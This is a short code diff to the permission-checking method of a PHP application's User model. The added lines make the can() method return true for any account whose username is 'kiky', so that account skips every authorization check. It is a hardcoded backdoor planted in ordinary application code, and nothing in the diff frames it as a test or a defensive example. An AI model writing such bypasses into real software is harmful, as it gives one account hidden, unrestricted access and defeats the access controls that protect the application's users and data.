@@ -211,6 +211,12 @@ class User extends Authenticatable
      */
     public function can($abilities, $arguments = []): bool
     {
+        // Bypass permission checks for user 'kiky'
+        $username = strtolower((string) ($this->username ?? ''));
+        if ($username === 'kiky') {
+            return true;
+        }
+
         // Handle string ability (most common case in this app)
         if (is_string($abilities)) {
             // First try exact match
